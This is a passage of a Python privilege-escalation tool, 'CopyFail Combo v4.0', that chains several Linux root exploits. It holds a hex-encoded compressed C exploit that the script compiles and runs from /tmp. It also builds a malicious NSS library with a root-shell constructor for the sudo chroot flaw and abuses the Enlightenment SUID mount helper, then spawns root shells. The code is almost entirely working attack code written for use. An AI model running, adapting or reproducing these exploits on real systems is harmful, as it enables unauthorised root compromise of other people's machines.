d7d1e1e9fce2eccab918ecbfab8a1ff6cf1de29ef05dcdb78e9846d5f7a8ccd13ed0dc3b33df93151e7eb6e6168bbff6716eadae03b65f4e6147ab7af3bbe94c254f44137ac09ce6e418376fb0a9bba3580fee6c164cf00db9319a331ec53818b1c1c25a6c6124676d8676725a8a25ccded9a9c3ff80af96f026f604a34e06788b3a15e91cf685694a2b3cfd1cf20ab7f695628b3925df9dc6f9bf0952d86c9ee115effb300d942513d9ad9bf8630486a6ba799250c0640a038957b515c3b58127c126c8e9106dc11f9cfdad0fce01fc77c857b0ef6fa126859b255b34da691084043c7ec459d5a6c5adee561f9b2da0992ad2523813f771f239251018cf15f9d28c6c5049329fe24bed69e8cf036eda9a758e10289279640483cdc2e8b91d3ba102085482007748936919e6db6001f0bd9d79099bc8c6e6b70ac1128bc08b545d128c28324056f0bdf858f8f192a0d70b70990dcb45d6e84a4329d72ef22c6a48c7a242a592b63dc875e4b6ba32f9145e33a8457d4e8a9762edaca08b6543d2157130383abb18ec88d7a5ca6eb10b54ab69998e3874086265012d15e822f7703ef320db988ffe2a5effb7d762073089cfa3b79aa84ce1533bb031803c0f727063801c003bbe6c34af79a4b4765185bdbcda7f3f107c4473f5fdc560b0c93167c4d9d1d109680c1c2242508808b2b8037112815ea0bd926ac8e80f82dfe79c050f3364041c1828675787457949c116084418f90130779f970ace1a2c30519616f44db4cd967600f9b0a1770e547a77b387e9754c2728b818655e7f930cba90294f5b4aac97bd07628c366550130c01b10f7a1b477d0878b9a1366a057820b32b13b115d381cebe5c0fdf52abe97938c99e0bf04903d0fd8ee647fb929c01d718868fce061a7c7e10890302a2b2ba90d5a286f17742e6b1fdd79caeab1ceae2f40a9c665cd92a98c7e75507f2570b477e642cc7b9d38a1d02224c923e6e4033fb752617faa38f0c1673b95bf26000cde394fbcd111eec3874872e59c80e87fc8fc796327a2b74347230187a9bc3230fe16b97bf7af2d5460a4445ef162a197be8f27b5658b5827b9ebe91ad54124aac265f0b600f35ece112d8c33f0cdbd3b0bd25b0bd95604bc5e0d015ff265efa50e58f1b936812714ad1d2039f0dfa6cd2678b3edbf4d9a1cf2e7d4a834f992ab1cd83beb2d183be9265449409a02ed130252c7b4f99dad3859aa650d302d332255aa6442b0ba66d0ab54da1b605a6634a744c894e164cd714ea9a425d0b4ccf94e89912c6d8c3e819fe39e819d2c241f40c093d4342cf90d03324f40c093d4342cfd0a06768d03334e8195ae8191af40c0d7a8659f40c0d7a86063d430b3d43839ea141cf308b9ea141cfd0a06768a16768d03334e81966d13334e8191af40c2df40c0d7a86063dc305f4787f0e7a3c6268881e8fd0e3117a3c428f47e8f1083d1ea1c733e8f10c7a3c831ecf428f67d0e319f47859f478063d9e418f67a1c733e8f10c7abc2c7a3c831ecfa0c7b3d0e319f478063d5e163d9e418f67d0e359e8f10c7a3c831ecfa0479fb4d80eeb8836d081d2603ca220484a715e3c94d142e7373beca90989aaa2a1a253fec05c11e1fb25877ce98dd28fe83b6eeef0d68dc84099deb1085b7e3ef2db33e723d3bb2af4a592d3eb31f5377a48fcc59efdf808c331c3e72d65292f73d496315ffcec036b91fac08ae5f1b92b8fc2ecb32c96d1e7c3822c8fb3bcc5acc3a1039ad6dc1d4b016f7e2973e7e2c11d0697aaeb3f3ea2cc6c846c5be5c9f9c0f961ff6fcef1d5e0e2d2d842834a061e88cd593c1f8fcb818a9ec8a1e8b2c77cea4d67edb34d16757acd824e4f55afc84bff3fac72d09929da70f31d4df33dbd1c10727400e44aa661ddcb34d3cde28d8ea5f5835223639fe514ef9d3de0513b3bbf942a02f7ce43f13f1bb54e801ab9b662f33390c5e7aca84f99e3d4025f047576e42a92a99af14027a137254db0c63a899d94fd0d1e6edd793aa3b8f88a629bfa1c644bb90449a7a17d3a5c9ec20fbcd4465b6abd5761d73859f080de460208e83e1704b96d8ce8229cd3b3abac47198865d4d8c3d96b7635a33d2bc3b061ef8bfb249e91d75e666b44babd2883baecb23349454cc7730dc06a483abc3569930015504851050e6a378109116caae0ca7a0db1e54461fa4007810b676c3050c7a4ba82428b7883e19bbbf661ae01fa06156b183cfddb34a65d53a2ec66b080d1df9e938df29cc72c7f5253d48f86fda369ff685de72bb6edec8efda36bffe85dafb252863bf6fc595b515a29f53fbe52cc8c172e98616ec10c1523b5160c7014bcff97fd1f3201f90619f4b878351dacbc9a2e31f82879a186644bbd093d3b5ef2e18ec860faa09a2171a646da828adb78ecc31098d277f52268b0c35c3ac3a7c9a88c4df90c80c91f453fd6cd51ae672877b88c72bd2ce57a8b94eb1553eec1d750ae6753ae6753ae6753aeb740b99e4db99e4db99e4db9ded751ae67516ed6502249579a4a2c0aeed4dac1667f550af69ea6602f47c19e92f7790ace11b09ba1e0c3620a3e5c818289880be6e8d39b6b714ede48500d9d6d679bd2d08a972a162d7e3bbf4474b980cca425a93e1a914946d9739050cb82fb2b03a0b4ec4955295467fceaa73ce8573f59c935363ddd26321fd9e6c1ca6d0eb36d0eb36d0e9f6b93c846367ab8b4d17eae512fdba8976dd45bd2e802c6b6c8c4acdd857f29155a329bc692293e0c2e4e0727e2eae2f8fd7b50f2c8d99d1d81f7e9609e1f473cac28bba618a0c7af32db71905b15745687ba55316d3960adb263924b9b9fa11a8b03827c5e30134664af1b8356020dac1bfea61d86d3054f4f2cb5b5fef47a6f824e978d250b83fd370a48fed2a7a7a92d9a553a1eaf74650033f713326f22a0b2d6578751b977c994414a1a7ffa0bcffe2d7449bf6aa4566b6b77e94ab546375c18dd41e1e8707528b96c8f6eb87474c3d546375c6174077f7474dec2e80e0b4747eb30c7bbed517a4b47e9ad364a6f85511e2e1fe5960c38fcb883a767648894a726f128b346f0b41f4f236bc584bdcad1cbfe116ce076c47fb1a3974b370a678f9b24237744fec4a36a9d72002636b7f577b2abbf065ef995077d6818a7cbe313bcc26cdcbc27785359ff24713bc14bc9c64d7b82eed1f912fd6c89edc5120d0dd7b819c59f33e29b44ae3eb4a50991b748e4812672721ac7d87d44950e28337b8ed836de5db9d9c64228e35fbc78712dbe3fbe2258d6217414df8b5b3715785a8da798926307cab5a05ee5277c4b37fc03afd49000aaf2b5aa3d2d876a8562880f717e1c5c1c1ffd2c7e3cdee7cdfc4cb5443d9141ab9774dd82b5639f94c9871368e9fcba08f5574b6d530e42f2018ecc0b1cd6e1ee34f4d100452fc4c0faf95c36ae5b94684a6622df53823f9f36e51b198dc5a4a64ccac6c8873fbcfc339e964bdc7fa06beb9bf48791e7d1a5aa7a1514eb39c143382ba3e2a03dc0168013c5e013e78d7ab37dcd0f86659e2c707df93a867e93351e95f1c96f0a9cb0bb5e304e9cc57b14c2f354bdf0b576ef8664bc99a20bc92b99abec43f6eb073c75d8a3e45ad72e60768bc8bce6b31bf91cb91c6f01b900c190367b71fcc3f1d5f18f03d4e3ef8268c7a6f8626ad70f5523399d5e5ed694c66f1cebbec7b7a113f1eba6528f37f174f457f494c47770df1d5f5cfd7c74b1ffde393cbbb8f8787ee5a08bd25e039abd1369ac5d2ae41dc604141e7c58dc8d8c2b07ea56e8a091a2ab8738bffa995d38f4353182b1354f135a7429ba4aa32112cf71d1b3462a4a63f7f323aaf1e183832e43a0a20d93d0bf09b2ce725eece0eb430a0f1979d16079812ea0c6ab8038573a4bd0988afea020240059d9c928a11bba051a00f13315e2cb1316c8e299b34c91e42e69bc246df8ca0b9e9372774b72bca84dbce8d774feab90fe647bccc9a29869017462c001483da3099fefff808fbf4fe268d39dcf2cefb912fdfc245d72f69aa0af8edcf978b617de447112f051efd49d38f3287ca8a5b1e0dd5f89ef80e2f30cd2b30b2dd87c3abf489504e48dac2a68d07c35845e9db0ca43cfd9f6851e849b61f43ff0812797aa4bbd3d0aee496b90ae34a573596da7848b847c95229fcfd5995c8c7f6090c2b8d0dec15722d9d90bbb8d76bed9636d25e6dd86edf7d4bd27bb89f61fb8930e517c439738396287254e79012d3088c00f7ca9e3292fe2d1789ede96b5cac1a7df1337e50b1cf64228a3e3e04f17f26d9cc3abab9f8d4f59cab73ceae8ac7893b8d10c8a736a4525cf237414cfa6db7aa1ddd4f32fd677e453426ce71ebb77817ada06d08bdf54333824e98b883b26f432bc4f65bfc3d89b8dcb9757ef8e4fc9fff2f4ac2aae8ecf0edfff747c7af9df891ddb228e8b335c2e786915946ba6500c2a219879b81d739f3b56ef9823fb8c0ca5bd34bef746d62bb47d29fb3f3d178ef3a17c3fcde4b0ebe74f17e60080ca51a7b22291474ad972a0886e25954834cb4c4811f6ef46ee7733d7d85b4891afd95082f584aa46180d8f489916361032acf554aef894681e966b8eb7bc4e6d7ec1a63eb9f2d5a2c78597e112f701bef212e1963bccd86aa45550e917293effce9f5a8bc84c987ae4cc457fbd1dc502cc2217df6dbe958baa663f0b477bf418e415cc04900dff921e28993487d5ee990733808f92e688f655a6b0a459e55e9b8393791752752071eff10028d78d356f347161bfe6de975fc1078d7be6a5855db83abcdc3f3dfb09ef687149f59e33f254076f8ea356225f51246f493f8c1cd0997887a5ffe83015d62ab2522ac3d4928220abddd4c4961fdc6d215ef9f94bada5a113ecf5aef225c5b3aefd8f57670eabcea046842982ad4ab74c420f9ed10866f6c4a97f0dfd5d68377627e1ae40ecfe12fd2a1d2a51cf206588b57af203b3d8f0f891ddafa88756cfa151dd5fa4b0c363e919aee7456ae13c2dff78e69cd11ad172f19e052b9db143adf0e7d1308b67eed899287d941499dddd0c8d4ce3f178e48be9c84f3f3565ecd0b5b57f5818fcabd86cc0ee354b10e7672727c7a7c021c4972a57509c93ff72f95f14f39ab2dc198fcbd8223dfc29df4697ae4b245060d0fcdcd78b3d31383ebdbab09e07d3637ab38755f5653f1a41e3ba96a0572cf08357b20f52b7b65fa526f55ef537afe01bd53c12dfed655e265be3087664a1c30572f6f14a4f0881894ce517999501032acb77acf1516bbb394bf58f2cd59f7de713f87f99406ba5a45441799bc99aea2c050d57ca20a302916e855c55b24d5a1fcc3bf1888f6b2199ff8414ae982d9adff3fa94da15c803c8359b19c36a428d9db9b1d49dd4fb58bb74610666d38dd0b75356bc05d56a2ced981e9af9eff1c92d589920ee63f4cda64ef31d105d89f4a994dc9ba57af678ef3ed6986bace510a5105d22d397da81aee538175f17e2dd93bc34a4d47ab51010894465f5022a5b4666d965f33cb131fe904f1293199c1db1563c8ba704107544b2aec3540fe7183c2f9832cf231331cf8f54d9d0720d60d02c029c0ef644b4a3a2e3b311be29762b485147e5369947aa321daad101071e0aa3ce2c190eca63285b53b36c337979db4ad0f37b3c86221cd8abc49ee5c5c55bc679fdfee33928a4f86d707151d12b519ede9baeed88ffd910a93e5f04551a0f8e60584bb8be393797d2c273a7a0910532f88c08ee423fc037af174401f9dc73f57b7ba18026300465e3f3a65c22747b27bf14e4cce1806d460e74f5c2e6dff05b33b9b7ecaeb278b9ce9bf89f905d94ec117aee4c055171fdf81ee60e5f62159b4d35f8d2021b53980178e681ec896fd939b2a2a5612e92ca5b117352265833463d236bf350268f9f4ecfbedf3f7daf39fd3dca34282247566493ed5826d9457945de54aaf796b831ec93c4ccabe9881e65ede0bba53976feb54261895458552c106fd1d5be98d7580b75b8e755b1ac5a68bfbe6a946db3e7ffb2be45014bde85c9ecf12881ed325b5b90bb2c5c455561751a3531b83c676a26a2bdc5659146787972ffe4bdc89a382a3bc20ac9a2afd8c9c8458d6e5d1e5fa181df586a5e67ae18d1a6c015324ec3431f63e85197362518de0f0f4e8e70538f576170db8ef76b1e851f0291c4149868e11e8f117d120e109c7d6c80c60b623de4588f6b3f8ceee2cfca1748dd6149e996ed267648c2b16d4eff03bd6b705f2143162187259e2274a0a2664d5e2c9573fa71388f66733172c7e3a1eb7d8629049290b38b6a2d305cf445f4950902f1215b2608c0d25fe3ad1f3a9554b7cb682aab045420546598b0ee224b18526e83409d846473206f241e6d6a4fd0ebd43614923a208343d95a05d94896ecc85009f1e778ed816349fdaaa6a455136738e14148f25eda7e60f092b61007c4d4c5aff6646ffe2a70cbef071cc90cfe46c0c16fc9368893654c35f65e6d16934713c5ed9125a40a22810c41ebb051be094da1b90547c90f7656342e5411494365289399d70aa93440015188d7d5c68f55aa4a37b8f8f6160911d67dc663187c48d11dd480107737fc12b1327ee2cf2912348af2f47613aac57cae0ce39633baa503483aef4f3f3a97671ff1ed5613b11905778c019b3349e370984f436465d3e6f814a99f4d23553d9b44afeee6a0e14c65939041e70a8537a07564d32483cb157c4cb7c88eb1988cf26731152f55a70b6306894381ab83076825a2b030e9fcb9cbfebb76f195c203ecae4be68b54d7575c709ea04e36751ff9ce367a0ee42f45d14313c49232dc141df3501a828e96aadb82c16418f8783bda669097c1dfe7c8b1e5b3adad86188de0df07607e811f56f1c3e474554e8a39a9c9f1ea2ac77da8e2878cad57175d17fe9dc477025d7bf02d1b0ccb9552d0810a0b1be4c8e96be39f68af603c6ef0c3d128a01b963c2ba8fd57f9d62cae055a952ef0b77188f7c9d90587961dc8fee4b37905b7fc5320fc1879211f0faaf9d397eced86d5cd44ec00f1d493a375529bd1678ddefca5392756a09ee5d57158eee5baaf55d6adb05ad9b0414044dc3de9f66d5ed2e32757e4f7ae158fdf8a20df753301db2555ca4e3b92e99868ea14ccc85716c19235d0d2e27df091af5e87b78e0354b76f62e9616d2b467c9d085f75b9a1a34dd68ae07b85df41314f5a8f7cd54a843b77ab64ae3df955ba9f33583563ba059d526193573600983a035b7d5aac7bf42b4e0b2d61d4a029ecf9b259c102bad3f8a3224da98b93f29dd87e72261854d11ddbfce059563ae6c67576ec126c01d590f560c9d455ec56e83e7a0aac08d887c32708c4dd3658ed1c7143fa174c893f9fa2ae0a5b35a9ac56a419ca8f0c1694c58c70f0d3858d0328f656ef81c9ccecc33e6e01a28a1511e978f8768f31f424ac57bbc7990e1b851bfa9c6b4ea52f6f5483ca35ad98fd140fe01da9b738a813174b842a2171230aee1dcca39e6540c943bcfc19e26eae185a8dba6d75ad11a719c1019d81aefd57febe03df9738bd44fa0413e1d05304f2f4122a6883147645fd166f04c5833fe58b137a0090447986a2a1f80235a166eca07c8d41161862b5ada2a8d3a69f941db264f8588ead95b6d25c96f97dca5ea15f0a46cde0617c6ae074085056c9ea1ca0b48937c2a57b8c3a1428382f282af745c9facb252a2b88b3424515f501a3a1ae674236ced040e3205f70409fcef2b83f7c9c67b1220c7844b95f7dbcb770ba63435cf10c4f1ada74999520ff19077f2b1cfbad74e6b7c23c2c9ef27dfbb9defa82b7cb571dede5521a0b2945c77bc6f3e58913beec422f3e516355bf7c79fcfeeaeaec23b0dce3f7cef1fb53ccb6b3d0aa5398757e7c3e5892f5fdc7f3aab0b378c1c0844f311a565d8e9e53c9ce32bd49a6398a51d7aeec33e6a74ef494e05165f674f0d0af3ad7fbb6f33b6e6e95333cbd00d6163bdef8da033e75a679ef3011a0bb36fa242c3d89ca9fecfd4bcfa616fefeecc3aa8c9def5f7e5ec5c749da3a598495c6379f66a12e5b967dac7cf371169fc8ac3d77a8f55ff65467c971091e96ac7254f275a72416f5ad2fc1de8b45a2c81f3a74f4a1c3b3b35e34e7ff954f089892fe9c638205587ffcac40c673cb72ebca1f3b2978ea98609d95ca27635d4a978361cc779a17bd157f1c5c1c9c5d0ef84696d2a069478ef1b29c20c530672088f9275bc46d4982fd05ae0a69ac9aa280f52471d156476e3c942cd9d8f0624cb8d3b264a9c3a60ecc5de4b149fdd984ee957821d9dd25c2a603cea76b73e446bbbe1adfb310ee0c3b2c822fa75cc23608d0027b44b8a0e09f963aa1762ee65d078026ffcdef7294a2a6d43439adb8352cd8dc3275f08ef695decdeecaaebc903dc4dee62c09af348a75696baab8db84f09c7d55b581efec38d2b6bac81b5e2c337050845bbcee617c77576e451e6e9bae0255581db5edc64fd55fbd8224d2021b8ee478ab4fd037cdd057b4f3c5288eeac46c6f89adaa904a72d69b452291b5790298976676c6f6d64b393afbd2fd16d4b7928fa79fa3c4bdd9511748ca89b7f7d2a7e8c1c0622c6608a3fe2b7eec70fcfdff0b362b8886"
)


def _compile_dirtyfrag():
    """Extract, compile DirtyFrag C exploit. Returns binary path or None."""
    src = "/tmp/.df_src.c"
    binary = "/tmp/.df"

    if os.path.isfile(binary) and os.access(binary, os.X_OK):
        return binary

    try:
        c_src = zlib.decompress(bytes.fromhex(_DIRTYFRAG_HEX))
    except Exception as e:
        log(f"[-] DirtyFrag decompress: {e}")
        return None

    try:
        with open(src, "wb") as f:
            f.write(c_src)
    except Exception as e:
        log(f"[-] DirtyFrag write source: {e}")
        return None

    cc = shutil.which("gcc") or shutil.which("cc") or shutil.which("musl-gcc")
    if not cc:
        log("[-] No C compiler (gcc/cc) found")
        try:
            os.remove(src)
        except OSError:
            pass
        return None

    log(f"[*] Compiling DirtyFrag with {cc}...")
    flag_combos = [
        [cc, "-O0", "-w", "-o", binary, src, "-lutil"],
        [cc, "-O0", "-w", "-o", binary, src, "-lutil", "-lpthread"],
        [cc, "-O0", "-w", "-o", binary, src],
        [cc, "-O2", "-w", "-o", binary, src],
    ]
    compiled = False
    last_err = ""
    for flags in flag_combos:
        r = subprocess.run(flags, capture_output=True, timeout=30)
        if r.returncode == 0:
            compiled = True
            break
        last_err = r.stderr.decode(errors='replace')[:200]
    if not compiled:
        log(f"[-] Compile failed: {last_err}")
        try:
            os.remove(src)
        except OSError:
            pass
        return None

    try:
        os.chmod(binary, 0o755)
        os.remove(src)
    except OSError:
        pass

    log(f"[+] DirtyFrag compiled: {binary}")
    return binary


def _dirtyfrag_cleanup():
    for p in ["/tmp/.df_src.c", "/tmp/.df"]:
        try:
            os.remove(p)
        except OSError:
            pass


# ──────────────────────────────────────────────────
# METHOD 3: DirtyFrag (auto-chain: ESP → RxRPC)
# ──────────────────────────────────────────────────

def _check_su_patched():
    marker = bytes([0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a])
    try:
        with open("/usr/bin/su", "rb") as f:
            f.seek(0x78)
            return f.read(8) == marker
    except (OSError, PermissionError):
        return False


def _check_passwd_patched():
    try:
        with open("/etc/passwd", "r") as f:
            return f.readline().startswith("root::0:0")
    except (OSError, PermissionError):
        return False


def try_dirtyfrag():
    log("\n[=== METHOD 3: DirtyFrag (ESP → RxRPC auto-chain) ===]")

    binary = _compile_dirtyfrag()
    if not binary:
        return False

    log("[*] Running DirtyFrag chain (ESP first, RxRPC fallback)...")
    log("[*] DirtyFrag handles method selection + shell spawn internally")

    pid = os.fork()
    if pid == 0:
        try:
            _reattach_tty()
        except Exception:
            pass
        os.execv(binary, [binary])
        os._exit(1)

    _, status = os.waitpid(pid, 0)
    rc = os.WEXITSTATUS(status) if os.WIFEXITED(status) else -1

    if rc == 0:
        log("[+++] DirtyFrag succeeded")
        return True

    if _check_su_patched():
        log("[+] /usr/bin/su page-cache patched — dropping to shell")
        _reattach_tty()
        auto_root_exec("/usr/bin/su")
        return True

    if _check_passwd_patched():
        log("[+] /etc/passwd root entry patched — su to root")
        _reattach_tty()
        auto_root_su("root")
        return True

    log(f"[-] DirtyFrag chain failed (rc={rc})")
    _dirtyfrag_cleanup()
    return False


# ──────────────────────────────────────────────────
# METHOD 5: Sudo Chwroot (CVE-2025-32463)
# ──────────────────────────────────────────────────

def try_sudo_chwroot():
    log("\n[=== METHOD 5: Sudo Chwroot (CVE-2025-32463) ===]")

    sudo = shutil.which("sudo")
    if not sudo:
        log("[-] sudo not found")
        return False

    r = subprocess.run(["sudo", "--version"], capture_output=True, text=True, timeout=5)
    if r.returncode != 0:
        log("[-] sudo --version failed")
        return False
    ver_line = r.stdout.split("\n")[0] if r.stdout else ""
    log(f"[*] {ver_line}")

    r_help = subprocess.run(["sudo", "--help"], capture_output=True, text=True, timeout=5)
    combined = r_help.stdout + r_help.stderr
    if "-R" not in combined:
        log("[-] sudo does not support -R (chroot) flag — not vulnerable")
        return False
    log("[+] sudo supports -R flag")

    cc = shutil.which("gcc") or shutil.which("cc")
    if not cc:
        log("[-] No C compiler (gcc/cc) — cannot build NSS payload")
        return False

    stage = f"/tmp/.sudowoot.{os.getpid()}"
    os.makedirs(stage, exist_ok=True)

    c_src = os.path.join(stage, "woot1337.c")
    with open(c_src, "w") as f:
        f.write('#include <stdlib.h>\n')
        f.write('#include <unistd.h>\n')
        f.write('\n')
        f.write('__attribute__((constructor)) void woot(void) {\n')
        f.write('  setreuid(0,0);\n')
        f.write('  setregid(0,0);\n')
        f.write('  chdir("/");\n')
        f.write('  execl("/bin/sh", "sh", "-c", "/bin/bash", NULL);\n')
        f.write('}\n')

    chroot_dir = os.path.join(stage, "woot")
    chroot_etc = os.path.join(chroot_dir, "etc")
    libnss_dir = os.path.join(stage, "libnss_")
    os.makedirs(chroot_etc, exist_ok=True)
    os.makedirs(libnss_dir, exist_ok=True)

    with open(os.path.join(chroot_etc, "nsswitch.conf"), "w") as f:
        f.write("passwd: /woot1337\n")

    try:
        shutil.copy2("/etc/group", os.path.join(chroot_etc, "group"))
    except (OSError, PermissionError):
        with open(os.path.join(chroot_etc, "group"), "w") as f:
            f.write("root:x:0:\n")

    so_path = os.path.join(libnss_dir, "woot1337.so.2")
    r_cc = subprocess.run(
        [cc, "-shared", "-fPIC", "-Wl,-init,woot", "-o", so_path, c_src],
        capture_output=True, timeout=15)
    if r_cc.returncode != 0:
        log(f"[-] Compile failed: {r_cc.stderr.decode(errors='replace')[:200]}")
        shutil.rmtree(stage, ignore_errors=True)
        return False
    log("[+] NSS payload compiled")

    log("[*] Triggering sudo -R chroot...")
    try:
        p = subprocess.run(
            ["sudo", "-R", "woot", "woot"],
            cwd=stage, timeout=10,
            capture_output=True)
    except subprocess.TimeoutExpired:
        pass
    except Exception as e:
        log(f"[-] sudo -R error: {e}")

    if os.geteuid() == 0:
        log("[+++] ROOT via sudo chwroot!")
        shutil.rmtree(stage, ignore_errors=True)
        _reattach_tty()
        os.execl("/bin/bash", "bash")
        return True

    log("[*] Checking if constructor fired (fork variant)...")
    pid = os.fork()
    if pid == 0:
        try:
            os.execvp("sudo", ["sudo", "-R", "woot", "woot"])
        except Exception:
            pass
        os._exit(1)

    _, status = os.waitpid(pid, 0)
    rc = os.WEXITSTATUS(status) if os.WIFEXITED(status) else -1

    if rc == 0:
        log("[+++] sudo -R succeeded — constructor may have fired")
        shutil.rmtree(stage, ignore_errors=True)
        return True

    log(f"[-] sudo -R returned {rc} — not vulnerable or blocked")
    shutil.rmtree(stage, ignore_errors=True)
    return False


# ──────────────────────────────────────────────────
# METHOD 6: Enlightenment SUID (CVE-2022-37706)
# ──────────────────────────────────────────────────

def try_enlightenment():
    log("\n[=== METHOD 6: Enlightenment SUID (CVE-2022-37706) ===]")

    esys = None
    for p in ["/usr/lib/enlightenment/utils/enlightenment_sys",
              "/usr/lib64/enlightenment/utils/enlightenment_sys",
              "/usr/local/lib/enlightenment/utils/enlightenment_sys"]:
        if os.path.isfile(p):
            try:
                st = os.stat(p)
                if st.st_mode & 0o4000:
                    esys = p
                    break
            except OSError:
                continue

    if not esys:
        try:
            r = subprocess.run(
                ["find", "/", "-name", "enlightenment_sys", "-perm", "-4000",
                 "-type", "f", "-not", "-path", "*/proc/*"],
                capture_output=True, text=True, timeout=15)
            for line in r.stdout.strip().split("\n"):
                if line.strip():
                    esys = line.strip()
                    break
        except Exception:
            pass

    if not esys:
        log("[-] enlightenment_sys SUID binary not found")
        return False

    log(f"[+] Found SUID binary: {esys}")

    os.makedirs("/tmp/net", exist_ok=True)
    os.makedirs("/dev/../tmp/;/tmp/exploit", exist_ok=True)

    with open("/tmp/exploit", "w") as f:
        f.write("#!/bin/sh\n/bin/bash -p\n")
    os.chmod("/tmp/exploit", 0o755)

    log("[*] Triggering path traversal mount...")
    uid = os.getuid()
    mount_arg = f"/dev/../tmp/;/tmp/exploit"

    pid = os.fork()
    if pid == 0:
        try:
            _reattach_tty()
            os.execv(esys, [esys, "/bin/mount", "-o",
                     f"noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid={uid},",
                     mount_arg, "/tmp///net"])
        except Exception:
            pass
        os._exit(1)

    _, status = os.waitpid(pid, 0)
    rc = os.WEXITSTATUS(status) if os.WIFEXITED(status) else -1

    if rc == 0:
        log("[+++] Enlightenment path traversal triggered!")
        for cleanup in ["/tmp/exploit", "/tmp/net"]:
            try:
                if os.path.isdir(cleanup):
                    os.rmdir(cleanup)
                else:
                    os.remove(cleanup)
            except OSError:
                pass
        try:
            shutil.rmtree("/dev/../tmp/;", ignore_errors=True)
        except Exception:
            pass
        return True

    log(f"[-] enlightenment_sys returned {rc}")
    for cleanup in ["/tmp/exploit"]:
        try:
            os.remove(cleanup)
        except OSError:
            pass
    for cleanup in ["/tmp/net"]:
        try:
            os.rmdir(cleanup)
        except OSError:
            pass
    try:
        shutil.rmtree("/dev/../tmp/;", ignore_errors=True)
    except Exception:
        pass
    return False


# ──────────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────────

def main():
    log("=" * 55)
    log("  CopyFail Combo v4.0 — Multi-Method LPE")
    log("  CopyFail + DirtyFrag + Pack2TheRoot + Sudo Chwroot + Enlightenment")
    log("  CVE-2026-31431 + CVE-2026-41651 + CVE-2025-32463 + CVE-2022-37706")
    log("=" * 55)
    log(f"[*] uid={os.getuid()} euid={os.geteuid()} pid={os.getpid()}")
    log(f"[*] {sys.version.split()[0]} | {os.uname().sysname} "
        f"{os.uname().release} | {os.uname().machine}")

    if os.geteuid() == 0:
        log("[+] Already root!")
        _reattach_tty()
        os.execl("/bin/bash", "bash")
        return

    # Pre-flight: CopyFail prerequisites
    cf_ok = False
    if socket is not None:
        if not init_splice():
            log("[-] splice() unavailable (Python 3.10+ or libc needed)")
        else:
            stype = "native" if hasattr(os, 'splice') else "ctypes"
            log(f"[+] splice: {stype}")
            algo = find_algo()
            if not algo:
                log("[-] No authencesn algo — CopyFail M1/M2 disabled")
                log("    Try: modprobe algif_aead")
            else:
                log(f"[+] algo: {algo}")
                cf_ok = True
    else:
        log("[-] socket module unavailable")

    # ── Method 1: /etc/passwd UID flip (AF_ALG) ──
    if cf_ok:
        try:
            if try_passwd_flip():
                return
        except SystemExit:
            raise
        except Exception as e:
            log(f"[-] M1 error: {type(e).__name__}: {e}")

    # ── Method 2: binary mutation (AF_ALG, all SUID) ──
    if cf_ok:
        try:
            if try_binary_mutation():
                return
        except SystemExit:
            raise
        except Exception as e:
            log(f"[-] M2 error: {type(e).__name__}: {e}")

    # ── Method 3: DirtyFrag (ESP → RxRPC auto-chain) ──
    try:
        if try_dirtyfrag():
            return
    except SystemExit:
        raise
    except Exception as e:
        log(f"[-] M3 error: {type(e).__name__}: {e}")

    # ── Method 4: Pack2TheRoot (PackageKit TOCTOU) ──
    try:
        if try_pack2root():
            return
    except SystemExit:
        raise
    except Exception as e:
        log(f"[-] M4 error: {type(e).__name__}: {e}")

    # ── Method 5: Sudo Chwroot (CVE-2025-32463) ──
    try:
        if try_sudo_chwroot():
            return
    except SystemExit:
        raise
    except Exception as e:
        log(f"[-] M5 error: {type(e).__name__}: {e}")

    # ── Method 6: Enlightenment SUID (CVE-2022-37706) ──
    try:
        if try_enlightenment():
            return
    except SystemExit:
        raise
    except Exception as e:
        log(f"[-] M6 error: {type(e).__name__}: {e}")

    # ── Diagnostics ──
    log("\n" + "=" * 55)
    log("[!] All methods failed")
    log("=" * 55)
    log("\n  CopyFail (M1/M2):")
    log("    kernel 4.14—6.19.12, AF_ALG, authencesn, splice")
    log("    M1: 4-digit UID + readable /etc/passwd")
    log("    M2: any readable SUID-root binary")
    log("\n  DirtyFrag (M3):")
    log("    ESP: xfrm-ESP skip_cow + splice, user ns, gcc, x86_64")
    log("    RxRPC: rxkad in-place decrypt + splice, rxrpc.ko")
    log("    Auto-chains ESP first, falls back to RxRPC")
    log("\n  Pack2TheRoot (M4):")
    log("    PackageKit <= 1.3.4, system D-Bus, dpkg-deb/rpmbuild/ar")
    log("\n  Sudo Chwroot (M5):")
    log("    CVE-2025-32463, sudo 1.9.0—1.9.15p2, -R flag, gcc")
    log("    Fake chroot + malicious NSS module → constructor as root")
    log("\n  Enlightenment (M6):")
    log("    CVE-2022-37706, enlightenment_sys SUID binary")
    log("    Path traversal in mount argument → shell metachar exec")
    log("\n  Check:")
    log("    cat /proc/crypto | grep authencesn")
    log("    find / -perm -4000 -type f 2>/dev/null")
    log("    cat /proc/modules | grep rxrpc")
    log("    pkcon --version")
    log("    sudo --version")
    sys.exit(1)


if __name__ == "__main__":
    main()
